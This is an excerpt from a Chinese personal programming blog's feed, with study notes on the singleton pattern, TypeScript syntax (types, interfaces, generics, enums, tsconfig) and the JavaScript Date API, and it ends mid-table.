      <content type="html"><![CDATA[<h3 id="1-单例模式"><a href="#1-单例模式" class="headerlink" title="1. 单例模式"></a>1. 单例模式</h3><p>单例模式，一个类只允许创建一个实例。单例模式的应用场景，一般为了避免资源访问冲突、表示业务概念上的全局唯一类。</p><p>单例实现的方式</p><ul><li>饿汉式： 在类加载期间，就已经将instance静态实例初始化好了。因此不支持延迟加载实例</li><li>懒汉式： 支持延迟加载，但是会导致频繁加锁，释放锁，频繁的调用会产生性能瓶颈</li><li>双重检测：既支持延迟加载，又支持高并发。只要instance被创建后，再次调用getInstance就不会进入加锁逻辑中</li></ul><p>单例模式的问题</p><ul><li>对继承、多态的支持不友好</li><li>单例类不支持有参数的构造函数。解决方法：①创建完实例后，再调用init函数传递参数。②将参数放到getInstance中</li></ul><p>解决方法</p><ul><li>用静态方法实现</li></ul><h3 id="2-工厂模式"><a href="#2-工厂模式" class="headerlink" title="2. 工厂模式"></a>2. 工厂模式</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Typescript语法</title>
      <link href="/2020/05/18/typescript/"/>
      <url>/2020/05/18/typescript/</url>
      <content type="html"><![CDATA[<h3 id="1-为什么要用TypeScript"><a href="#1-为什么要用TypeScript" class="headerlink" title="1. 为什么要用TypeScript"></a>1. 为什么要用TypeScript</h3><ul><li><p><em>验证约束、用法提示</em><br>类型是人为添加的一种编程约束和用法提示。目的是在开发过程中，提供自动补全、验证提示</p></li><li><p><em>减少代码重构带来的未知影响</em><br>Typescript有助于代码重构，因为不确定修改后是否会影响到其他部分的代码。类型信息检查大大减轻了重构的成本。一般来说，只要函数或对象的参数和返回值保持类型不变，就能基本确定，重构后的代码也能正常运行。</p></li></ul><p><br></p><h3 id="2-类型声明"><a href="#2-类型声明" class="headerlink" title="2. 类型声明"></a>2. 类型声明</h3><h4 id="2-1-基本类型"><a href="#2-1-基本类型" class="headerlink" title="2.1 基本类型"></a>2.1 基本类型</h4><p>为 JavaScript 变量加上了类型声明。类型声明并不是必需的，如果没有，TypeScript 会自己推断类型。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name: string = <span class="string">'陈皮皮'</span>;</span><br><span class="line">name = <span class="number">9527</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></p><ul><li><p>any类型</p><ul><li><em><code>any</code></em>: 没有任何限制</li><li><em><code>unknown</code></em>: 表明类型不确定，可以是任意类型</li><li><em><code>never</code></em>: 表示不能赋给它任何值，否则都会报错<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params">msg:string</span>):<span class="title">never</span> </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>基本类型</p><ul><li><em><code>boolean</code></em></li><li><em><code>string</code></em></li><li><em><code>number</code></em>: 所有整数和浮点数</li><li><em><code>bigint</code></em>: 所有大整数</li><li><em><code>symbol</code></em></li><li><em><code>object</code></em>: 包含了所有对象、数组和函数</li><li><em><code>undefined</code></em> 未定义</li><li><em><code>null</code></em> 空值</li><li><em><code>void</code></em> 表示函数没有返回值</li></ul></li><li><p>联合类型<br>符合 A 或 B 都行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bye: string | number;</span><br></pre></td></tr></table></figure></li><li><p>交叉类型<br>必须同时属于 A 和 B </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x: number &amp; string;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-数组"><a href="#2-2-数组" class="headerlink" title="2.2 数组"></a>2.2 数组</h4><p>如果变量的初始值是空数组，那么 TypeScript 会推断数组类型是<code>any[]</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr:number[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr:(number|string)[];</span><br><span class="line"><span class="keyword">let</span> arr:<span class="built_in">Array</span>&lt;number|string&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组</span></span><br><span class="line"><span class="keyword">const</span> multi:number[][] = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>]];</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-元祖"><a href="#2-3-元祖" class="headerlink" title="2.3 元祖"></a>2.3 元祖</h4><p>元组必须明确声明每个成员的类型<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> t:[number] = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> s:[string, string, boolean] = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="literal">true</span>];</span><br><span class="line">type t1 = [string, number, ...boolean[]]; <span class="comment">// 表示数组第三个元素开始到后面都是boolean</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-函数"><a href="#2-4-函数" class="headerlink" title="2.4 函数"></a>2.4 函数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">txt:string</span>):<span class="title">void</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x?:number</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数默认值</span></span><br><span class="line">function createPoint(x:number = 0, y:number = 0):[number, number] &#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-5-对象"><a href="#2-5-对象" class="headerlink" title="2.5 对象"></a>2.5 对象</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj:&#123; <span class="attr">x</span>:number; y:number; &#125; = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;;</span><br></pre></td></tr></table></figure><h4 id="2-6-类"><a href="#2-6-类" class="headerlink" title="2.6 类"></a>2.6 类</h4><h5 id="2-6-1-Implements关键字"><a href="#2-6-1-Implements关键字" class="headerlink" title="2.6.1 Implements关键字"></a>2.6.1 Implements关键字</h5><p>类使用 implements 关键字，表示当前类满足这些外部类型条件的限制。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">type Country = &#123;</span><br><span class="line">  name:string;</span><br><span class="line">  capital:string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyCountry</span> <span class="title">implements</span> <span class="title">Country</span> </span>&#123;</span><br><span class="line">  name = <span class="string">''</span>;</span><br><span class="line">  capital</span><br></pre></td></tr></table></figure></p><h5 id="2-6-2-可访问属性修饰符"><a href="#2-6-2-可访问属性修饰符" class="headerlink" title="2.6.2 可访问属性修饰符"></a>2.6.2 可访问属性修饰符</h5><p><code>public</code> 修饰符表示这是公开成员，外部可以自由访问<br><code>private</code> 私有成员，只能用在当前类的内部，类的实例和子类都不能使用该成员。<br><code>protected</code> 保护成员，只能在类的内部使用该成员，实例无法使用该成员，但是子类内部可以使用。<br><code>static</code> 静态成员是只能通过类本身使用的成员，不能通过实例对象使用。<br><code>abstract</code> 该类不能被实例化，只能当作其他类的模板<br><code>readonly</code> 用来定义只读的字段，使得字段 只能在创建的时候赋值一次。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">  public <span class="keyword">static</span> name = <span class="string">'陈皮皮'</span>;</span><br><span class="line">  private secret = <span class="string">'*******'</span>;</span><br><span class="line">  protected password = <span class="string">'********'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-基本语法"><a href="#3-基本语法" class="headerlink" title="3. 基本语法"></a>3. 基本语法</h3><h4 id="3-1-别名-Type"><a href="#3-1-别名-Type" class="headerlink" title="3.1 别名 Type"></a>3.1 别名 Type</h4><p>用来定义一个类型的别名。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">type MyObj = &#123; <span class="comment">// 为对象类型声明一个别买那个</span></span><br><span class="line">  x:number;</span><br><span class="line">  y?:number; <span class="comment">// 可选属性</span></span><br><span class="line">  <span class="comment">// 无法得知事前会有多少属性，允许这种属性名的索引类型</span></span><br><span class="line">  [property: string]: string;</span><br><span class="line">  [property: number]: number;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> obj:MyObj = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-接口-Interface-extends"><a href="#3-2-接口-Interface-extends" class="headerlink" title="3.2 接口 Interface, extends"></a>3.2 接口 Interface, extends</h4><p>interface 是对象的模板，可以看作是一种类型约定，中文译为“接口”。使用了某个模板的对象，就拥有了指定的类型结构。<br>interface 可以表示对象的各种语法，它的成员有5种形式。</p><ul><li>对象属性</li><li>对象的属性索引</li><li>对象方法</li><li>函数</li><li>构造函数</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface Human &#123;</span><br><span class="line">  name: string;</span><br><span class="line">  [prop: string]: number; <span class="comment">// 属性索引</span></span><br><span class="line">  readonly id: number; <span class="comment">// 只读属性</span></span><br><span class="line">  hair?: number; <span class="comment">// 可选属性</span></span><br><span class="line">  run(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>interface可以继承，相当于多个接口合并</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface Shape &#123;</span><br><span class="line">  name: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Circle extends Style, Shape &#123;</span><br><span class="line">  radius: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>Type 和 Interface 的区别？ </em><br>很多对象类型既可以用 interface 表示，也可以用 type 表示。<br>interface 与 type 的区别有下面几点。</p><ul><li>type能够表示非对象类型，而interface只能表示对象类型（包括数组、函数等）。</li><li>interface可以继承其他类型，type不支持继承。</li></ul></li></ul><p><br></p><h4 id="3-3-泛型-Generics"><a href="#3-3-泛型-Generics" class="headerlink" title="3.3 泛型 Generics"></a>3.3 泛型 Generics</h4><p>有些时候，函数返回值的类型与参数类型是相关的。<br><code>&lt;T&gt;</code>可以理解为类型声明需要的变量。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFirst</span>&lt;<span class="title">T</span>&gt;(<span class="params">arr:T[]</span>):<span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Nullable&lt;T&gt; = T | <span class="literal">undefined</span> | <span class="literal">null</span>;</span><br><span class="line">type Container&lt;T&gt; = &#123; <span class="attr">value</span>: T &#125;;</span><br><span class="line"><span class="keyword">const</span> a: Container&lt;number&gt; = &#123; <span class="attr">value</span>: <span class="number">0</span> &#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-枚举-enum"><a href="#3-4-枚举-enum" class="headerlink" title="3.4 枚举 enum"></a>3.4 枚举 enum</h4><p>需要定义一组相关的常量。Enum 结构里面包含4个成员，他们的默认值分别为0,1,2,3。你可以给它们设置具体值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up = <span class="number">1</span>,</span><br><span class="line">    Down = <span class="number">2</span>,</span><br><span class="line">    Left = <span class="number">3</span>,</span><br><span class="line">    Right = <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> direction: Direction = Direction.Up; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-5-断言-as"><a href="#3-5-断言-as" class="headerlink" title="3.5 断言 as"></a>3.5 断言 as</h4><p>TypeScript 一旦发现存在类型断言，就不再对该值进行类型推断，而是直接采用断言给出的类型。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type T = <span class="string">'a'</span>|<span class="string">'b'</span>|<span class="string">'c'</span>;</span><br><span class="line"><span class="keyword">let</span> foo = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bar:T = foo; <span class="comment">// 报错，原因是typescirpt推断foo的类型是string，给bar复制string就报错</span></span><br><span class="line"><span class="keyword">let</span> bar:T = foo <span class="keyword">as</span> T; <span class="comment">// 正确</span></span><br></pre></td></tr></table></figure></p><p>类型断言并不意味着，可以把某个值断言为任意类型。<code>T</code>最起码是<code>foo(string)</code>的子类型</p><p><br></p><h4 id="3-6-import-export"><a href="#3-6-import-export" class="headerlink" title="3.6 import/export"></a>3.6 import/export</h4><p>TypeScript 允许输出和输入类型<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type Bool = <span class="literal">true</span> | <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">export</span> &#123; Bool &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Bool &#125; <span class="keyword">from</span> <span class="string">'./a'</span>;</span><br><span class="line"><span class="keyword">let</span> foo:Bool = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-7-命名空间-namespace"><a href="#3-7-命名空间-namespace" class="headerlink" title="3.7 命名空间 namespace"></a>3.7 命名空间 namespace</h4><p>自从能 <code>import/export</code>后，官方已经不推荐使用 <code>namespace</code> 了。<br>namespace 用来建立一个容器，内部的所有变量和函数，都必须在这个容器里面使用。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shapes.ts</span></span><br><span class="line"><span class="keyword">export</span> namespace Shapes &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Triangle</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Shapes &#125; <span class="keyword">from</span> <span class="string">'./shapes'</span>;</span><br><span class="line"><span class="keyword">let</span> t = <span class="keyword">new</span> Shapes.Triangle();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-d-ts-声明文件"><a href="#4-d-ts-声明文件" class="headerlink" title="4. d.ts 声明文件"></a>4. d.ts 声明文件</h3><p><code>d.ts</code>文件，会自动将类型声明文件加入编译，不用手动import<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types.d.ts</span></span><br><span class="line"><span class="keyword">export</span> interface Character &#123;</span><br><span class="line">  catchphrase?: string;</span><br><span class="line">  name: string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-注释指令"><a href="#5-注释指令" class="headerlink" title="5. 注释指令"></a>5. 注释指令</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @ts-nocheck</span></span><br><span class="line"><span class="comment">// 不对当前脚本进行类型检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// @ts-check</span></span><br><span class="line"><span class="comment">// 对该脚本进行类型检查，不论是否启用了checkJs编译选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// @ts-ignore</span></span><br><span class="line"><span class="comment">// 不对下一行代码进行类型检查</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-tsconfig-json"><a href="#6-tsconfig-json" class="headerlink" title="6. tsconfig.json"></a>6. tsconfig.json</h3><p>tsconfig.json是 TypeScript 项目的配置文件，放在项目的根目录。</p><ul><li>include：指定哪些文件需要编译</li><li>exclude: 从编译列表中去除指定的文件<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"include"</span>: [<span class="string">"./src/**/*"</span>],</span><br><span class="line">  <span class="string">"exclude"</span>: [<span class="string">"**/*.spec.ts"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="7-tsc-命令行编译器"><a href="#7-tsc-命令行编译器" class="headerlink" title="7. tsc 命令行编译器"></a>7. tsc 命令行编译器</h3><p>tsc 是 TypeScript 官方的命令行编译器，用来检查代码，并将其编译成 JavaScript 代码。</p><p>tsc 默认使用当前目录下的配置文件tsconfig.json，但也可以接受独立的命令行参数。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://wangdoc.com/typescript/declare" target="_blank" rel="noopener">阮一峰 - typescript教程</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Date</title>
      <link href="/2020/05/06/Date/"/>
      <url>/2020/05/06/Date/</url>
      <content type="html"><![CDATA[<h3 id="1-Date对象"><a href="#1-Date对象" class="headerlink" title="1. Date对象"></a>1. Date对象</h3><p><code>Date()</code>构造函数有四种基本形式</p><ul><li><p><strong>没有参数</strong> : 如果没有输入任何参数，Date构造器会依据系统设置的当前时间来创建一个Date对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>()</span><br></pre></td></tr></table></figure></li><li><p><strong>Unix时间戳</strong> : 一个整数值，表示自1970年1月1日 00:00:00 UTC以来的毫秒数。注意时间戳仅精确到秒。如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(value)</span><br></pre></td></tr></table></figure></li><li><p><strong>时间戳字符串</strong> : 表示日期的字符串值。如果要用日期字符串参数，则需要用全球都能接受的格式，其中一种格式是ISO 8601扩展格式，其中小时、分钟、秒、毫秒都是可选的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ISO 8601 Extended format</span></span><br><span class="line"><span class="comment">  YYYY：4位数年份</span></span><br><span class="line"><span class="comment">  MM：两位数月份(即 1月为01,12月为12)</span></span><br><span class="line"><span class="comment">  DD：两位数的日期(0到31)</span></span><br><span class="line"><span class="comment">  -：日期分隔符</span></span><br><span class="line"><span class="comment">  T：表示开始时间</span></span><br><span class="line"><span class="comment">  HH：24位小时数（0到23）</span></span><br><span class="line"><span class="comment">  mm：分钟（0到59）</span></span><br><span class="line"><span class="comment">  ss：秒（0到59）</span></span><br><span class="line"><span class="comment">  sss：毫秒（0到999）</span></span><br><span class="line"><span class="comment">  :：时间分隔符</span></span><br><span class="line"><span class="comment">  Z：如果存在Z，则日期将设置为UTC，如果Z不存在，则为本地时间。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">`YYYY-MM-DDTHH:mm:ss:sssZ`</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>分别提供日期时间的每一个成员</strong><br>注意：如果数值大于合理范围时（如monthIndex = 13, minutes = 70），相邻的数值会被调整</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(year, monthIndex, day, hours, minutes, seconds, milliseconds)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">13</span>, <span class="number">1</span>) </span><br><span class="line"><span class="comment">// 相当于 new Date(2014, 1, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">70</span>)</span><br><span class="line"><span class="comment">// 相当于 new Date(2013, 2, 1, 1, 10)</span></span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>参数</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td>year</td><td style="text-align:center">表示年份的整数值，0-99会被映射至1900-1999年，其他值代表实际年份</td></tr><tr><td>monthIndex</td><td style="text-align:center">表示月份的整数值，从0（ 1月 ）到11（ 12月 ）</td></tr><tr><td>day</td><td style="text-align:center">可选，表示一个月中的第几天的整数值，从1开始。默认值为1</td></tr><tr><td>hours</td><td style="text-align:center">可选，表示小时的整数值（24小时制）。默认值为0</td></tr><tr><td>minutes</td><td style="text-align:center">可选，表示分钟的整数值。默认值为0</td></tr><tr><td>secondes</td><td style="text-align:center">可选，表示秒的整数值。默认值为0</td></tr><tr><td>millseconds</td><td style="text-align:center">可选，表示毫秒的整数值。默认值为0</td></tr></tbody></table><p><br></p><h3 id="2-方法"><a href="#2-方法" class="headerlink" title="2. 方法"></a>2. 方法</h3><p>由于存在时区的概念，JS里有两个时间：本地时间和协调世界时(UTC时间)。</p><ul><li><em>本地时间</em> 是指你的计算机所在的时区</li><li><em>UTC</em> 是格林威治标准时间(GMT)的同义词</li></ul><p>JS中的每个日期方法都是本地时间，只有指定UTC，才能获取UTC时间。中国处于东八区，与UTC时间相差8小时，UTC时间00:00:00的时候，我们的时间是08:00:00</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-11-11'</span>)</span><br><span class="line"><span class="comment">// Wed Nov 11 2020 08:00:00 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>方法</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td><code>Date.now()</code></td><td style="text-align:center">返回自1970-1-1 00:00:00 UTC至今所经过的毫秒数</td></tr><tr><td><code>Date.UTC()</code></td><td style="text-align:center">接受构造函数最长形式的参数相同的参数，返回从1970-1-1 00:00:00开始所经过的毫秒数</td></tr><tr><td><code>Date.parse()</code></td><td style="text-align:center">解析一个表示日期的字符串，返回从1970-1-1 00:00:00所经过的毫秒数(不推荐使用)</td></tr><tr><td><em>Getter 本地时间</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.getFullYear()</code></td><td style="text-align:center">返回年份(四位数字)</td></tr><tr><td><code>Date.prototype.getMonth()</code></td><td style="text-align:center">返回月份(0~11)</td></tr><tr><td><code>Date.prototype.getDate()</code></td><td style="text-align:center">返回月份中的第几天(1~31)</td></tr><tr><td><code>Date.prototype.getDay()</code></td><td style="text-align:center">返回星期中的第几天(0~6)</td></tr><tr><td><code>Date.prototype.getHours()</code></td><td style="text-align:center">返回小时(0~23)</td></tr><tr><td><code>Date.prototype.getMinutes()</code></td><td style="text-align:center">返回分钟(0~59)</td></tr><tr><td><code>Date.prototype.getSeconds()</code></td><td style="text-align:center">返回秒数(0~59)</td></tr><tr><td><code>Date.prototype.getMilliseconds()</code></td><td style="text-align:center">返回毫秒(0~999)</td></tr><tr><td><code>Date.prototype.getTime()</code></td><td style="text-align:center">返回从1970-1-1 00:00:00所经过的毫秒数</td></tr><tr><td><code>Date.prototype.getTimezoneOffset</code></td><td style="text-align:center">返回当前时区的时区偏移</td></tr><tr><td><em>Setter 本地时间</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.setFullYear()</code></td><td style="text-align:center">设置年份(四位数字)</td></tr><tr><td><code>Date.prototype.setMonth()</code></td><td style="text-align:center">设置月份(0~11)</td></tr><tr><td><code>Date.prototype.setDate()</code></td><td style="text-align:center">设置月份中的第几天(1~31)</td></tr><tr><td><code>Date.prototype.setHours()</code></td><td style="text-align:center">设置小时(0~23)</td></tr><tr><td><code>Date.prototype.setMinutes()</code></td><td style="text-align:center">设置分钟(0~59)</td></tr><tr><td><code>Date.prototype.setSeconds()</code></td><td style="text-align:center">设置秒数(0~59)</td></tr><tr><td><code>Date.prototype.setMilliseconds()</code></td><td style="text-align:center">设置毫秒(0~999)</td></tr><tr><td><code>Date.prototype.setTime()</code></td><td style="text-align:center">指定时间戳来设置日期对象的时间</td></tr><tr><td><em>Getter 世界时间</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.getUTCFullYear()</code></td><td style="text-align:center">返回年份(四位数字)</td></tr><tr><td><code>Date.prototype.getUTCMonth()</code></td><td style="text-align:center">返回月份(0~11)</td></tr><tr><td><code>Date.prototype.getUTCDate()</code></td><td style="text-align:center">返回月份中的第几天(1~31)</td></tr><tr><td><code>Date.prototype.getUTCDay()</code></td><td style="text-align:center">返回星期中的第几天(0~6)</td></tr><tr><td><code>Date.prototype.getUTCHours()</code></td><td style="text-align:center">返回小时(0~23)</td></tr><tr><td><code>Date.prototype.getUTCMinutes()</code></td><td style="text-align:center">返回分钟(0~59)</td></tr><tr><td><code>Date.prototype.getUTCSeconds()</code></td><td style="text-align:center">返回秒数(0~59)</td></tr><tr><td><code>Date.prototype.getUTCMilliseconds()</code></td><td style="text-align:center">返回毫秒(0~999)</td></tr><tr><td><code>Date.prototype.getUTCTime()</code></td><td style="text-align:center">返回从1970-1-1 00:00:00所经过的毫秒数</td></tr><tr><td><em>Setter 世界时间</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.setUTCFullYear()</code></td><td style="text-align:center">设置年份(四位数字)</td></tr><tr><td><code>Date.prototype.setUTCMonth()</code></td><td style="text-align:center">设置月份(0~11)</td></tr><tr><td><code>Date.prototype.setUTCDate()</code></td><td style="text-align:center">设置月份中的第几天(1~31)</td></tr><tr><td><code>Date.prototype.setUTCHours()</code></td><td style="text-align:center">设置小时(0~23)</td></tr><tr><td><code>Date.prototype.setUTCMinutes()</code></td><td style="text-align:center">设置分钟(0~59)</td></tr><tr><td><code>Date.prototype.setUTCSeconds()</code></td><td style="text-align:center">设置秒数(0~59)</td></tr><tr><td><code>Date.prototype.setUTCMilliseconds()</code></td><td style="text-align:center">设置毫秒(0~999)</td></tr><tr><td><em>Conversion getter</em></td><td 